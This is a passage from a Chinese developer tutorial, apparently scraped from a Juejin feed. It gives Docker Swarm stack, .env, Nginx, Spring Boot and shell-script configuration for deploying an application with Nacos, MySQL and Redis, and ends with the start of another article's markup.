      <span class="hljs-attr">MYSQL_SERVICE_PASSWORD:</span> <span class="hljs-string">${NACOS_DB_PASSWORD}</span>
      <span class="hljs-attr">NACOS_AUTH_ENABLE:</span> <span class="hljs-string">${NACOS_AUTH_ENABLE:-false}</span>
      <span class="hljs-attr">NACOS_AUTH_TOKEN:</span> <span class="hljs-string">${NACOS_AUTH_TOKEN:-SecretKey012345678901234567890123456789012345678901234567890123456789}</span>
      <span class="hljs-attr">NACOS_AUTH_IDENTITY_KEY:</span> <span class="hljs-string">${NACOS_AUTH_IDENTITY_KEY:-serverIdentity}</span>
      <span class="hljs-attr">NACOS_AUTH_IDENTITY_VALUE:</span> <span class="hljs-string">${NACOS_AUTH_IDENTITY_VALUE:-security}</span>
      <span class="hljs-attr">JVM_XMS:</span> <span class="hljs-string">${NACOS_JVM_XMS:-512m}</span>
      <span class="hljs-attr">JVM_XMX:</span> <span class="hljs-string">${NACOS_JVM_XMX:-512m}</span>
      <span class="hljs-attr">JVM_XMN:</span> <span class="hljs-string">${NACOS_JVM_XMN:-256m}</span>
      <span class="hljs-attr">TZ:</span> <span class="hljs-string">Asia/Shanghai</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">nacos-conf:/home/nacos/conf</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">nacos-data:/home/nacos/data</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">nacos-logs:/home/nacos/logs</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"${NACOS_PORT:-8848}:8848"</span>  <span class="hljs-comment"># 主端口</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"${NACOS_PORT_GRPC:-9848}:9848"</span>  <span class="hljs-comment"># gRPC端口，用于服务发现</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"${NACOS_PORT_GRPC_PLUS:-9849}:9849"</span>  <span class="hljs-comment"># gRPC端口+1000</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">backend</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-attr">mysql:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">service_healthy</span>
    <span class="hljs-attr">configs:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">source:</span> <span class="hljs-string">nacos-config</span>
        <span class="hljs-attr">target:</span> <span class="hljs-string">/home/nacos/conf/application.properties</span>
    <span class="hljs-attr">deploy:</span>
      <span class="hljs-attr">mode:</span> <span class="hljs-string">replicated</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-string">${NACOS_REPLICAS:-1}</span>
      <span class="hljs-attr">update_config:</span>
        <span class="hljs-attr">parallelism:</span> <span class="hljs-number">1</span>
        <span class="hljs-attr">delay:</span> <span class="hljs-string">10s</span>
        <span class="hljs-attr">order:</span> <span class="hljs-string">start-first</span>
      <span class="hljs-attr">restart_policy:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">on-failure</span>
        <span class="hljs-attr">delay:</span> <span class="hljs-string">10s</span>
        <span class="hljs-attr">max_attempts:</span> <span class="hljs-number">3</span>
      <span class="hljs-attr">resources:</span>
        <span class="hljs-attr">limits:</span>
          <span class="hljs-attr">memory:</span> <span class="hljs-string">1G</span>
        <span class="hljs-attr">reservations:</span>
          <span class="hljs-attr">memory:</span> <span class="hljs-string">512M</span>
      <span class="hljs-attr">placement:</span>
        <span class="hljs-attr">constraints:</span>
          <span class="hljs-bullet">-</span> <span class="hljs-string">node.labels.nacos</span> <span class="hljs-string">==</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># 可以给节点打标签</span>
    <span class="hljs-attr">healthcheck:</span>
      <span class="hljs-attr">test:</span> [<span class="hljs-string">"CMD"</span>, <span class="hljs-string">"curl"</span>, <span class="hljs-string">"-f"</span>, <span class="hljs-string">"http://localhost:8848/nacos/v1/ns/operator/metrics"</span>]
      <span class="hljs-attr">interval:</span> <span class="hljs-string">30s</span>
      <span class="hljs-attr">timeout:</span> <span class="hljs-string">10s</span>
      <span class="hljs-attr">retries:</span> <span class="hljs-number">3</span>
      <span class="hljs-attr">start_period:</span> <span class="hljs-string">60s</span>

  <span class="hljs-comment"># Spring Boot应用</span>
  <span class="hljs-attr">app:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">${APP_IMAGE}</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">app</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-attr">SPRING_PROFILES_ACTIVE:</span> <span class="hljs-string">${SPRING_PROFILE:-prod}</span>
      <span class="hljs-attr">SPRING_CLOUD_NACOS_DISCOVERY_SERVER-ADDR:</span> <span class="hljs-string">nacos:8848</span>
      <span class="hljs-attr">SPRING_CLOUD_NACOS_CONFIG_SERVER-ADDR:</span> <span class="hljs-string">nacos:8848</span>
      <span class="hljs-attr">SPRING_CLOUD_NACOS_USERNAME:</span> <span class="hljs-string">${NACOS_USERNAME:-nacos}</span>
      <span class="hljs-attr">SPRING_CLOUD_NACOS_PASSWORD:</span> <span class="hljs-string">${NACOS_PASSWORD:-nacos}</span>
      <span class="hljs-attr">SPRING_DATASOURCE_URL:</span> <span class="hljs-string">jdbc:mysql://mysql:3306/${MYSQL_DATABASE}?useUnicode=true&amp;characterEncoding=utf8&amp;useSSL=false&amp;allowPublicKeyRetrieval=true&amp;serverTimezone=Asia/Shanghai</span>
      <span class="hljs-attr">SPRING_DATASOURCE_USERNAME:</span> <span class="hljs-string">${MYSQL_USER}</span>
      <span class="hljs-attr">SPRING_DATASOURCE_PASSWORD:</span> <span class="hljs-string">${MYSQL_PASSWORD}</span>
      <span class="hljs-attr">SPRING_REDIS_HOST:</span> <span class="hljs-string">redis</span>
      <span class="hljs-attr">SPRING_REDIS_PORT:</span> <span class="hljs-number">6379</span>
      <span class="hljs-attr">SPRING_REDIS_PASSWORD:</span> <span class="hljs-string">${REDIS_PASSWORD}</span>
      <span class="hljs-attr">JAVA_OPTS:</span> <span class="hljs-string">"-Xmx512m -Xms256m -Duser.timezone=Asia/Shanghai"</span>
      <span class="hljs-attr">TZ:</span> <span class="hljs-string">Asia/Shanghai</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app-logs:/app/logs</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app-data:/app/data</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"${APP_PORT:-8080}:8080"</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">backend</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-attr">mysql:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">service_healthy</span>
      <span class="hljs-attr">redis:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">service_healthy</span>
      <span class="hljs-attr">nacos:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">service_healthy</span>
    <span class="hljs-attr">deploy:</span>
      <span class="hljs-attr">mode:</span> <span class="hljs-string">replicated</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-string">${REPLICAS:-2}</span>
      <span class="hljs-attr">update_config:</span>
        <span class="hljs-attr">parallelism:</span> <span class="hljs-number">1</span>
        <span class="hljs-attr">delay:</span> <span class="hljs-string">10s</span>
        <span class="hljs-attr">order:</span> <span class="hljs-string">start-first</span>
      <span class="hljs-attr">restart_policy:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">on-failure</span>
        <span class="hljs-attr">delay:</span> <span class="hljs-string">10s</span>
        <span class="hljs-attr">max_attempts:</span> <span class="hljs-number">3</span>
      <span class="hljs-attr">resources:</span>
        <span class="hljs-attr">limits:</span>
          <span class="hljs-attr">memory:</span> <span class="hljs-string">1G</span>
        <span class="hljs-attr">reservations:</span>
          <span class="hljs-attr">memory:</span> <span class="hljs-string">512M</span>
    <span class="hljs-attr">healthcheck:</span>
      <span class="hljs-attr">test:</span> [<span class="hljs-string">"CMD"</span>, <span class="hljs-string">"curl"</span>, <span class="hljs-string">"-f"</span>, <span class="hljs-string">"http://localhost:8080/actuator/health"</span>]
      <span class="hljs-attr">interval:</span> <span class="hljs-string">30s</span>
      <span class="hljs-attr">timeout:</span> <span class="hljs-string">10s</span>
      <span class="hljs-attr">retries:</span> <span class="hljs-number">3</span>
      <span class="hljs-attr">start_period:</span> <span class="hljs-string">40s</span>

  <span class="hljs-comment"># Nginx反向代理（可选）</span>
  <span class="hljs-attr">nginx:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">nginx:alpine</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">nginx</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"80:80"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"443:443"</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./config/nginx/nginx.conf:/etc/nginx/nginx.conf:ro</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./logs/nginx:/var/log/nginx</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./ssl:/etc/nginx/ssl:ro</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">backend</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">nacos</span>
    <span class="hljs-attr">deploy:</span>
      <span class="hljs-attr">mode:</span> <span class="hljs-string">replicated</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span>
</code></pre>
<h3 data-id="heading-9">5. <code>.env</code> 文件</h3>
<pre><code class="hljs language-env" lang="env"># MySQL配置
MYSQL_ROOT_PASSWORD=YourStrongRootPassword
MYSQL_DATABASE=appdb
MYSQL_USER=appuser
MYSQL_PASSWORD=YourStrongAppPassword

# Redis配置
REDIS_PASSWORD=YourStrongRedisPassword

# Nacos配置
NACOS_VERSION=2.2.0
NACOS_MODE=standalone
NACOS_DB_PASSWORD=YourStrongNacosDbPassword
NACOS_AUTH_ENABLE=false
NACOS_AUTH_TOKEN=SecretKey012345678901234567890123456789012345678901234567890123456789
NACOS_USERNAME=nacos
NACOS_PASSWORD=nacos
NACOS_PORT=8848
NACOS_PORT_GRPC=9848
NACOS_REPLICAS=1

# 应用配置
APP_IMAGE=your-registry/springboot-app:1.0.0
APP_PORT=8080
SPRING_PROFILE=prod
REPLICAS=2

# Swarm配置
STACK_NAME=springboot-nacos-stack
</code></pre>
<h3 data-id="heading-10">6. Nginx配置（代理Nacos和App）</h3>
<h4 data-id="heading-11"><code>config/nginx/nginx.conf</code></h4>
<pre><code class="hljs language-nginx" lang="nginx">worker_processes auto;

events {
    worker_connections 1024;
}

http {
    upstream app_servers {
        least_conn;
        server app:8080;
    }

    upstream nacos_servers {
        least_conn;
        server nacos:8848;
    }

    # Nacos服务代理
    server {
        listen 8848;
        server_name nacos.your-domain.com;
        
        location / {
            proxy_pass http://nacos_servers;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_connect_timeout 60s;
            proxy_send_timeout 60s;
            proxy_read_timeout 60s;
            
            # 允许跨域（Nacos控制台需要）
            add_header Access-Control-Allow-Origin *;
            add_header Access-Control-Allow-Methods 'GET, POST, OPTIONS';
            add_header Access-Control-Allow-Headers 'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization';
        }
        
        access_log /var/log/nginx/nacos-access.log;
        error_log /var/log/nginx/nacos-error.log;
    }

    # 应用服务代理
    server {
        listen 80;
        server_name your-domain.com;
        
        location / {
            proxy_pass http://app_servers;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_connect_timeout 60s;
            proxy_send_timeout 60s;
            proxy_read_timeout 60s;
        }
        
        access_log /var/log/nginx/app-access.log;
        error_log /var/log/nginx/app-error.log;
    }
}
</code></pre>
<h3 data-id="heading-12">7. Spring Boot应用配置示例</h3>
<h4 data-id="heading-13"><code>bootstrap.yml</code>（应用配置文件）</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">your-app-name</span>
  
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">nacos:</span>
      <span class="hljs-attr">discovery:</span>
        <span class="hljs-attr">server-addr:</span> <span class="hljs-string">${SPRING_CLOUD_NACOS_DISCOVERY_SERVER_ADDR:nacos:8848}</span>
        <span class="hljs-attr">namespace:</span> <span class="hljs-string">${NACOS_NAMESPACE:}</span>
        <span class="hljs-attr">group:</span> <span class="hljs-string">${NACOS_GROUP:DEFAULT_GROUP}</span>
        <span class="hljs-attr">username:</span> <span class="hljs-string">${SPRING_CLOUD_NACOS_USERNAME:nacos}</span>
        <span class="hljs-attr">password:</span> <span class="hljs-string">${SPRING_CLOUD_NACOS_PASSWORD:nacos}</span>
      
      <span class="hljs-attr">config:</span>
        <span class="hljs-attr">server-addr:</span> <span class="hljs-string">${SPRING_CLOUD_NACOS_CONFIG_SERVER_ADDR:nacos:8848}</span>
        <span class="hljs-attr">file-extension:</span> <span class="hljs-string">yaml</span>
        <span class="hljs-attr">namespace:</span> <span class="hljs-string">${NACOS_NAMESPACE:}</span>
        <span class="hljs-attr">group:</span> <span class="hljs-string">${NACOS_GROUP:DEFAULT_GROUP}</span>
        <span class="hljs-attr">username:</span> <span class="hljs-string">${SPRING_CLOUD_NACOS_USERNAME:nacos}</span>
        <span class="hljs-attr">password:</span> <span class="hljs-string">${SPRING_CLOUD_NACOS_PASSWORD:nacos}</span>
        <span class="hljs-attr">refresh-enabled:</span> <span class="hljs-literal">true</span>

  <span class="hljs-attr">datasource:</span>
    <span class="hljs-attr">url:</span> <span class="hljs-string">${SPRING_DATASOURCE_URL}</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">${SPRING_DATASOURCE_USERNAME}</span>
    <span class="hljs-attr">password:</span> <span class="hljs-string">${SPRING_DATASOURCE_PASSWORD}</span>
    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>
    <span class="hljs-attr">hikari:</span>
      <span class="hljs-attr">maximum-pool-size:</span> <span class="hljs-number">10</span>
      <span class="hljs-attr">minimum-idle:</span> <span class="hljs-number">5</span>

  <span class="hljs-attr">redis:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-string">${SPRING_REDIS_HOST}</span>
    <span class="hljs-attr">port:</span> <span class="hljs-string">${SPRING_REDIS_PORT}</span>
    <span class="hljs-attr">password:</span> <span class="hljs-string">${SPRING_REDIS_PASSWORD}</span>
    <span class="hljs-attr">database:</span> <span class="hljs-number">0</span>
    <span class="hljs-attr">timeout:</span> <span class="hljs-string">5000ms</span>
    <span class="hljs-attr">lettuce:</span>
      <span class="hljs-attr">pool:</span>
        <span class="hljs-attr">max-active:</span> <span class="hljs-number">8</span>
        <span class="hljs-attr">max-idle:</span> <span class="hljs-number">8</span>
        <span class="hljs-attr">min-idle:</span> <span class="hljs-number">0</span>
</code></pre>
<h3 data-id="heading-14">8. 部署脚本</h3>
<h4 data-id="heading-15"><code>deploy.sh</code></h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-comment"># 设置颜色输出</span>
RED=<span class="hljs-string">'\033[0;31m'</span>
GREEN=<span class="hljs-string">'\033[0;32m'</span>
YELLOW=<span class="hljs-string">'\033[1;33m'</span>
NC=<span class="hljs-string">'\033[0m'</span> <span class="hljs-comment"># No Color</span>

<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>开始部署Spring Boot + Nacos项目...<span class="hljs-variable">${NC}</span>"</span>

<span class="hljs-comment"># 检查Docker Swarm是否已初始化</span>
<span class="hljs-keyword">if</span> ! docker node <span class="hljs-built_in">ls</span> &amp;&gt; /dev/null; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${YELLOW}</span>Docker Swarm未初始化，正在初始化...<span class="hljs-variable">${NC}</span>"</span>
    docker swarm init
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># 创建必要的目录</span>
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>创建必要的目录...<span class="hljs-variable">${NC}</span>"</span>
<span class="hljs-built_in">mkdir</span> -p logs/{app,nacos,nginx}
<span class="hljs-built_in">mkdir</span> -p data/{mysql,redis,app-data,nacos/{conf,data,logs}}
<span class="hljs-built_in">mkdir</span> -p config/{mysql-init,nacos,nginx}

<span class="hljs-comment"># 检查Nacos数据库脚本是否存在</span>
<span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">"config/mysql-init/nacos-schema.sql"</span> ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${YELLOW}</span>下载Nacos数据库脚本...<span class="hljs-variable">${NC}</span>"</span>
    curl -o config/mysql-init/nacos-schema.sql \
    https://raw.githubusercontent.com/alibaba/nacos/master/distribution/conf/mysql-schema.sql
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># 加载环境变量</span>
<span class="hljs-keyword">if</span> [ -f <span class="hljs-string">".env"</span> ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>加载环境变量...<span class="hljs-variable">${NC}</span>"</span>
    <span class="hljs-built_in">export</span> $(<span class="hljs-built_in">cat</span> .<span class="hljs-built_in">env</span> | grep -v <span class="hljs-string">'^#'</span> | xargs)
<span class="hljs-keyword">else</span>
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${RED}</span>错误: .env文件不存在<span class="hljs-variable">${NC}</span>"</span>
    <span class="hljs-built_in">exit</span> 1
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># 构建应用镜像（如果需要）</span>
<span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span> == <span class="hljs-string">"build"</span> ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>构建应用镜像...<span class="hljs-variable">${NC}</span>"</span>
    docker build -t <span class="hljs-variable">${APP_IMAGE}</span> .
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># 部署服务</span>
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>部署服务...<span class="hljs-variable">${NC}</span>"</span>
docker stack deploy -c docker-stack.yml <span class="hljs-variable">${STACK_NAME}</span>

<span class="hljs-comment"># 等待服务启动</span>
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>等待服务启动...<span class="hljs-variable">${NC}</span>"</span>
<span class="hljs-built_in">sleep</span> 30

<span class="hljs-comment"># 检查服务状态</span>
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>检查服务状态...<span class="hljs-variable">${NC}</span>"</span>
docker stack services <span class="hljs-variable">${STACK_NAME}</span>

<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>部署完成！<span class="hljs-variable">${NC}</span>"</span>
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"访问地址："</span>
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"  Nacos控制台: http://localhost:<span class="hljs-variable">${NACOS_PORT:-8848}</span>/nacos"</span>
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"  应用服务: http://localhost:<span class="hljs-variable">${APP_PORT:-8080}</span>"</span>
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"  数据库: localhost:3306"</span>
<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"  Redis: localhost:6379"</span>
</code></pre>
<h3 data-id="heading-16">9. 管理命令</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 给节点打标签（用于部署Nacos）</span>
docker node update --label-add nacos=<span class="hljs-literal">true</span> &lt;node-name&gt;

<span class="hljs-comment"># 查看Nacos日志</span>
docker service logs <span class="hljs-variable">${STACK_NAME}</span>_nacos -f

<span class="hljs-comment"># 查看所有服务</span>
docker stack ps <span class="hljs-variable">${STACK_NAME}</span>

<span class="hljs-comment"># 扩展Nacos实例（集群模式）</span>
docker service scale <span class="hljs-variable">${STACK_NAME}</span>_nacos=3

<span class="hljs-comment"># 备份Nacos配置</span>
tar -czf nacos-backup-$(<span class="hljs-built_in">date</span> +%Y%m%d).tar.gz data/nacos/conf/

<span class="hljs-comment"># 访问Nacos控制台</span>
<span class="hljs-comment"># 用户名: nacos</span>
<span class="hljs-comment"># 密码: nacos（默认）</span>
</code></pre>
<h3 data-id="heading-17">10. Nacos集群模式部署（可选）</h3>
<p>如果需要部署Nacos集群，需要：</p>
<ol>
<li>修改 <code>.env</code> 文件：</li>
</ol>
<pre><code class="hljs language-env" lang="env">NACOS_MODE=cluster
NACOS_REPLICAS=3
</code></pre>
<ol start="2">
<li>确保每个节点都有标签：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">docker node update --label-add nacos=<span class="hljs-literal">true</span> node1
docker node update --label-add nacos=<span class="hljs-literal">true</span> node2
docker node update --label-add nacos=<span class="hljs-literal">true</span> node3
</code></pre>
<ol start="3">
<li>创建集群配置文件并挂载到每个Nacos实例。</li>
</ol>
<p>这个配置实现了：</p>
<ul>
<li>Nacos使用外部MySQL存储配置</li>
<li>所有配置文件持久化到本地</li>
<li>Spring Boot应用从Nacos获取配置</li>
<li>完整的健康检查和服务依赖</li>
<li>日志和数据持久化</li>
</ul>
<p>请根据您的实际需求调整配置。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端向架构突围系列 - 框架设计（七）：反应式编程框架Flower的设计]]></title>    <link>https://juejin.cn/post/7594576956419850266</link>    <guid>https://juejin.cn/post/7594576956419850266</guid>    <pubDate>2026-01-13T05:35:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594576956419850266" data-draft-id="7594391758427389962" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端向架构突围系列 - 框架设计（七）：反应式编程框架Flower的设计"/> <meta itemprop="keywords" content="前端,架构"/> <meta itemprop="datePublished" content="2026-01-13T05:35:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端王壮壮"/> <meta itemprop="url" content="https://juejin.cn/user/4473272506789485"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端向架构突围系列 - 框架设计（七）：反应式编程框架Flower的设计
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4473272506789485/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端王壮壮
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T05:35:04.000Z" title="Tue Jan 13 2026 05:35:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    20
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color 